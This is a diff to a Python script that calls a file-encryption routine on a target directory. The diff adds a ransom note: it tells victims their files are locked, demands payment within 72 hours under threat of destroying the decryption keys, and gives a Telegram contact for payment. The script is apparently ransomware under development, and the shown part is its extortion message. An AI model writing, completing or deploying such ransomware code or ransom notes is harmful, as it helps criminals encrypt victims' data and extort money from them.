@@ -75,4 +75,21 @@ if __name__ == "__main__":
         encrypt_files_in_directory(target_directory, encryption_key)
 
 
+print("""
+Warning!
+
+Your files have been encrypted with military-grade encryption. Your documents, photos, videos, databases, and other important files are no longer accessible and have been locked. To regain access to your files, you must pay a ransom.
+
+You have 72 hours to make the payment. If the payment is not received within this period, the ransom amount will double. If no payment is received within 7 days, your decryption keys will be destroyed, and it will be impossible to recover your files.
+
+Payment instructions:
+
+My telegram :
+ https://t.me/ultimeworms
+
+
+Good Luck. Hahahah
+
+""")
+
 print("Programme terminé")
